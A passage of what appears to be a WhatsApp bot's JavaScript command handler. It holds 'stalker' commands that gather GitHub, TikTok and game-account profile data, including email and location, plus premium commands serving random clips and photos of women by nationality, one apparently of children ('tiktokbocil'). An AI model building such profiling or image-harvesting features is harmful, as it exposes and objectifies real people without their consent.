replygcyuta(mess.loading)
let githubstalk = require('./lib/scraper')
aj = await githubstalk.githubstalk(`${q}`)
Yuta.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygcyuta(`Example ${prefix+command} xeonapi`)
replygcyuta(mess.loading)
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
replygcyuta(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return replygcyuta(`Example ${prefix+command} 946716486`)
replygcyuta(mess.loading)
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygcyuta(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
			case 'mlstalk': {
if (!q) return replygcyuta(`Example ${prefix+command} 530793138|8129`)
replygcyuta(mess.loading)
let mlstalk = require('./lib/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcyuta(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'tiktokstalk': case 'ttstalk': {
if (!text) return replygcyuta(`Username? `)
const { tiktokStalk } = require('./lib/tiktoktop')
let hasil = await tiktokStalk(text)
let { uniqueId, nickname, avatarLarger, avatarMedium, avatarThumb, signature, region, privateAccount } = hasil.user
let { followerCount, followingCount, heart, videoCount, friendCount } = hasil.stats

let leocap = `┏⪻── *[ ᴛ ɪ ᴋ ᴛ ᴏ ᴋ - s ᴛ ᴀ ʟ ᴋ]* ──⪼┓
〆 ɴᴀᴍᴀ : ${nickname}
〆 ɴɪᴄᴋɴᴀᴍᴇ : @${uniqueId}
〆 ᴘᴇɴɢɪᴋᴜᴛ : ${followerCount}
〆 ᴍᴇɴɢɪᴋᴜᴛɪ : ${followingCount}
〆 ʟɪᴋᴇ : ${heart}
〆 ᴛᴏᴛᴀʟ ᴠɪᴅᴇᴏ : ${videoCount}
〆 ᴛᴇᴍᴀɴ : ${friendCount}
〆 ʙɪᴏ : ${signature}
〆 ᴀᴄᴄᴏᴜɴᴛ ᴘʀɪᴠᴀᴛᴇ : ${privateAccount}
〆 ʙᴀʜᴀsᴀ : ${region}
〆 ᴜʀʟ : https://tiktok.com/@${uniqueId}/
┗⪻─────────────────────────⪼┛`;

let leo = {
  text: leocap,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: nickname,
      mediaType: 1,
      previewType: 1,
      body: `@${uniqueId}`,
      //previewType: "PHOTO",
      thumbnailUrl: avatarMedium,
      renderLargerThumbnail: true,
      mediaUrl: `https://tiktok.com/@${uniqueId}/`,
      sourceUrl: `https://tiktok.com/@${uniqueId}/`
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Tt Stalk By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
}
break
case 'tiktokgirl':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokghea':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokbocil':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknukhty':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoksantuy':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokkayes':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokpanrika':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknotnot':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'chinese':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
case 'indo':{
if (!isPremium) return replyprem(mess.premium)
replygcyuta(mess.loading)
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Yuta.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Yuta.relayMessage(m.chat, msgs.message, {})
}
break
			case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
Yuta.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
			case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 